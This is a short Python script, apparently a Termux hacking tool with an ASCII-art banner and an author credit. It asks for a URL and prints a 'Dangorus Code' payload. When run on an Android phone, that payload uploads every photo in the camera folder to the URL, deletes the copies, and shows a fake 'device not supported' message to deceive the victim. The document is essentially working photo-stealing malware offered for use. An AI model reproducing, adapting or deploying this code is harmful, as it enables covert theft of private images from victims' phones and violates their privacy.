import os

os.system('clear')

  
print ("""\033[1;32;40m
                 ..................                            .........'',,,,''.........
          ......',;;;;;;,,,,;;:::;,'......
        .....,;:;,'......''''..'',;cc:,.....
      ....';c:,'........',,,,.......,;cl;.....
     ....,l:,'...........''''........',;ll,....
   ....':l;''....''             .......',:o:....
   ...'cl;,'.......              '......',:oc....
  ....:l:;'....'',               ........',:o:....
 ....'oc:;,'......                 ......',;cd'....
 ....:l:::,'..                        ...'',:o;....
 ....clc:;;,,','..                .......'',:o:....
 ....:l::::;''..';'              :,......'',:o:....
 ....,oc:::;,'',:lo.            ,oc,.....'',cd'....
  ....cl:::ccc:coo;.            .:l;'''''',;lc....
  ....'lc:clooooodo.            'lc;;;,,,,;ll'...
   ....'llclll:'..                 ...';;:oc'...
     ....;l;.                            ,,...

[+] Author  --> Seeker Def
[+] Youtube --> https://www.youtube.com/channel/UCgiEVDT3ZyxUEY8Orfo28gg
""")

url =input('Enter URL: ')
a="""import os
import requests
pwd=os.getcwd()
print ('\033[1;32;40mwait for 5 min.....')
path=('/data/data/com.termux/files/home/storage/dcim/Camera')
files = os.listdir(path)
for i in range(len(files)):
        os.chdir(path)
        a=(files[i])
        check=os.path.isfile(a)
        if check==False:
             pass
        else:
             cp=('cp '+a+' '+pwd)
             os.system(cp)
             os.chdir(pwd)
             image = {'image': open(a, 'rb')}
             r = requests.post( '"""
b="""' , files=image)
             rm=('rm '+a)
             os.system(rm)
os.system('clear')
print ('your device was not support')
"""
print ("""Dangorus Code:

""")
print (a+url+b)
